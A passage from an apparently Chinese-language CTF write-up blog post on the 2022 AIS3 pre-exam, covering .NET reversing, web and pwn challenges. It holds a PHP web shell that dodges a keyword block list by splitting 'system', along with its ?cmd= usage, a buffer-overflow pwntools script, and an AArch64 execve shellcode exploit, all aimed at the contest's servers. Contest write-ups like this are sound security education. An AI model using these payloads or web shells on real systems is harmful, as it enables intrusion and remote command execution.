        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
            res <span class="token operator">>>=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Flag <code>AIS3{You_are_the_master_of_time_management!!!!!}</code></p>
<h3 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h3><p>和去年一樣是 Net 相關題<br>用 <code>dnSpy</code> 打開 <code>AIS3*dll</code> 檔案們，可以在框起來的幾個檔案中看到很多條件，將他們整理一下<br><img src="https://i.imgur.com/NpIy5Rp.png"></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># AIS3</span>
<span class="token comment" spellcheck="true">#       012345678901234</span>
<span class="token comment" spellcheck="true"># r = 'AIS3{'</span>
ary <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span>
<span class="token triple-quoted-string string">'''check
len(r)=45
r[14]='A' r[3]='{'
'''</span>
<span class="token comment" spellcheck="true">#012</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>chr<span class="token punctuation">(</span>ary<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">'W'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># AIS33</span>
<span class="token comment" spellcheck="true">#     01234567890123456789012345678901234567890</span>
<span class="token comment" spellcheck="true">#r = 'D                                    G_G}'</span>
ary1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token triple-quoted-string string">'''check
len(r)=41
r[0]='D'
r[40]='}'
for i in range(3):
    (int)(right[37 + i] ^ 'B') != array[i])
'''</span>
<span class="token comment" spellcheck="true"># 37 38 39    </span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">[</span><span class="token number">37</span><span class="token operator">+</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ary1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># AIS333</span>
<span class="token comment" spellcheck="true">#      012345678901234567890123456789012345</span>
<span class="token comment" spellcheck="true"># r = '0T_N3T_FRAm3W0rk                  __</span>
ary2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span>
<span class="token triple-quoted-string string">'''check
len(r)=36
r[35]=r[34]='_'
r[15]='k'
'''</span>
<span class="token comment" spellcheck="true"># 0-14</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ary2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># AIS3333</span>
<span class="token comment" spellcheck="true">#      012345678901234567</span>
<span class="token comment" spellcheck="true"># r = '_15_S0_C0mPlicaT3d</span>
ary3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token triple-quoted-string string">'''check
len(r)=18
int num = int.Parse(this._calculator.Calculate("1+" + right.Substring(1, 2)));
if (num != 16) -> 1+(r[1]+r[2])==16? or 1+(r[1]r[2])==16? -> r[1:3] == `15` ?
'''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ary3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>ord<span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
</code></pre>
<p>整合以上的 <code>dll</code> 中得到的訊息</p>
<pre class=" language-bash"><code class="language-bash">      012345678901234
r <span class="token operator">=</span> <span class="token string">'AIS3{'</span>
     01234567890123456789012345678901234567890
r <span class="token operator">=</span> <span class="token string">'D                                    G_G}'</span>
     012345678901234567890123456789012345
r <span class="token operator">=</span> <span class="token string">'0T_N3T_FRAm3W0rk  
     012345678901234567
r = '</span>_15_S0_C0mPlicaT3d
</code></pre>
<p>(第一句當首，第二句涵蓋尾，第三句 <code>NET</code> 前可能有 <code>DOT</code>，將它和第二句接起來；第四句剛好能放進剩餘的空格內)<br>Flag <code>AIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}'</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Poking-Bear"><a href="#Poking-Bear" class="headerlink" title="Poking Bear"></a>Poking Bear</h3><blockquote>
<p>Poke the SECRET BEAR! </p>
</blockquote>
<p><img src="https://i.imgur.com/RZaxNT1.png"><br>Ice Bear 在 <code>bear/350</code> <img src="https://i.imgur.com/SpPfHPl.png"><br>Tasty Bear 在 <code>bear/777</code> <img src="https://i.imgur.com/odBz6VC.png"><br>那 Secret Bear 大概率在 350~777 中，於是就慢慢試…<br>直到 <code>bear/499</code> 出現了 Secret Bear<br><img src="https://i.imgur.com/3BFaDOs.png"><br>它叫我們 Human ，然後它說我們要是 <code>bear poker</code> 才能戳到 Secret Bear<br>按下 <code>Poke</code> 後，它會顯示<br><img src="https://i.imgur.com/Cu9kbc3.png"><br>看一下 Cookie ，它顯示我們是 Human<br><img src="https://i.imgur.com/A12hcbS.png"><br>將 <code>Value</code> 改成 <code>bear poker</code> 再 <code>Poke</code> 一次就能得到 flag 了<br><img src="https://i.imgur.com/8999rHs.png"><br>Flag <code>AIS3{y0u_P0l&lt;3_7h3_Bear_H@rdLy&gt;&lt;}</code></p>
<h3 id="Simple-File-Uploader"><a href="#Simple-File-Uploader" class="headerlink" title="Simple File Uploader"></a>Simple File Uploader</h3><p>我們可以上傳檔案，題目也給了 Source Code<br><img src="https://i.imgur.com/TsDV42N.png"><br><img src="https://i.imgur.com/Xr0KRQn.png"></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php2'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'php6'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'p...php ?? (((ﾟДﾟ;)))'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>首先會擋掉以上的副檔名，但是沒有限制到大寫，所以可以 <code>PHP</code>,<code>Php</code>,<code>pHp</code>…隨便組合</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'passthru'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'show_source'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'proc_open'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'pcntl_exec'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'assert'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'die'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'shell_exec'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'create_function'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'call_user_func'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'preg_replace'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'scandir'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$is_bad</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$is_bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You are bad ヽ(#`Д´)ﾉ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p><code>data</code> 內容會先被換成小寫，所以改大寫沒有用<br>但我們可以把 <code>system</code> 拆開來再合併<br>sol.pHp</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$s1</span> <span class="token operator">=</span> <span class="token string">'syst'</span><span class="token punctuation">;</span>
    <span class="token variable">$s2</span> <span class="token operator">=</span> <span class="token string">'em'</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$s1</span><span class="token punctuation">.</span><span class="token variable">$s2</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p>傳上去後先 <code>ls</code></p>
<pre class=" language-bash"><code class="language-bash">http://chals1.ais3.org:8988/uploads/bfefb4555ce483abe22aaa6a35057023/ea8676c576aa13bfaea3d726dc0590f7.pHp?cmd<span class="token operator">=</span>ls
</code></pre>
<p><img src="https://i.imgur.com/63O7bS3.png"></p>
<p>裡邊沒有跟 flag 有關的</p>
<p>看一下根目錄</p>
<pre class=" language-bash"><code class="language-bash">http://chals1.ais3.org:8988/uploads/bfefb4555ce483abe22aaa6a35057023/ea8676c576aa13bfaea3d726dc0590f7.pHp?cmd<span class="token operator">=</span>ls /
</code></pre>
<p>裡面有一個 <code>rUn_M3_t0_9et_fL4g</code></p>
<p><img src="https://i.imgur.com/H8on1lg.png"></p>
<p>所以跑一下</p>
<pre class=" language-bash"><code class="language-bash">http://chals1.ais3.org:8988/uploads/bfefb4555ce483abe22aaa6a35057023/ea8676c576aa13bfaea3d726dc0590f7.pHp?cmd<span class="token operator">=</span>/rUn_M3_t0_9et_fL4g
</code></pre>
<p>Flag <code>AIS3{H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و} </code></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="BOF2WIN"><a href="#BOF2WIN" class="headerlink" title="BOF2WIN"></a>BOF2WIN</h3><p>Buffer Overflow<br>Offset : <code>16 + 8 = 24</code></p>
<p><img src="https://i.imgur.com/ii6SIPe.png"></p>
<p>要進到 <code>get_the_flag()</code> ，看一下 address</p>
<p><img src="https://i.imgur.com/4V7O1EQ.png"></p>
<p>script</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true">#r = process('./bof2win')</span>
r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chals1.ais3.org'</span><span class="token punctuation">,</span> <span class="token number">12347</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x00401216</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>Flag <code>AIS3{Re@1_B0F_m4st3r!!}</code></p>
<h3 id="Give-Me-SC"><a href="#Give-Me-SC" class="headerlink" title="Give Me SC"></a>Give Me SC</h3><pre class=" language-c"><code class="language-c"><span class="token function">mprotect</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>從這可以看到執行權限是開著的<br>它會返回到 bss 端執行 shellcode，所以我們把 shellcode 傳進去然後執行<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/47048">shellcode 來源</a></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chals1.ais3.org'</span><span class="token punctuation">,</span><span class="token number">15566</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'aaaaaaaaaaaaaaa'</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span>  <span class="token string">"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"</span>
payload <span class="token operator">+=</span> <span class="token string">"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"</span>
payload <span class="token operator">+=</span> <span class="token string">"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"</span>

r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span>
<span class="token function">cd</span> home
<span class="token function">ls</span>
<span class="token function">cat</span> flag
</code></pre>
<p>Flag <code>AIS3{Y0uR_f1rst_Aarch64_Shellcoding}</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Gunjyo</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://gunjyo0817.github.io/2022/05/16/2022-AIS3-Pre-exam-write-up/">https://gunjyo0817.github.io/2022/05/16/2022-AIS3-Pre-exam-write-up/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint policy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Gunjyo</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/write-up/">
                                    <span class="chip bg-color">write-up</span>
                                </a>
                            
                                <a href="/tags/AIS3/">
                                    <span class="chip bg-color">AIS3</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;Current
            </div>
            <div class="card">
                <a href="/2022/05/16/2022-AIS3-Pre-exam-write-up/">
                    <div class="card-image">
                        
                        <img src="/imgs/ais32022.png" class="responsive-img" alt="2022 AIS3 Pre-exam write-up">
                        
                        <span class="card-title">2022 AIS3 Pre-exam write-up</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            2022 AIS3 pre-exam write-up
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-16
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/AIS3/" class="post-category">
                                    AIS3
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/write-up/">
                        <span class="chip bg-color">write-up</span>
                    </a>
                    
                    <a href="/tags/AIS3/">
                        <span class="chip bg-color">AIS3</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/05/13/CTF-Reverse-Angr/">
                    <div class="card-image">
                        
                        <img src="/imgs/angr.png" class="responsive-img" alt="CTF Reverse Angr">
                        
                        <span class="card-title">CTF Reverse Angr</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Reverse Angr Write-up，未完成
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-13
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Reverse/" class="post-category">
                                    Reverse
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/SCIST/">
                        <span class="chip bg-color">SCIST</span>
                    </a>
                    
                    <a href="/tags/write-up/">
                        <span class="chip bg-color">write-up</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
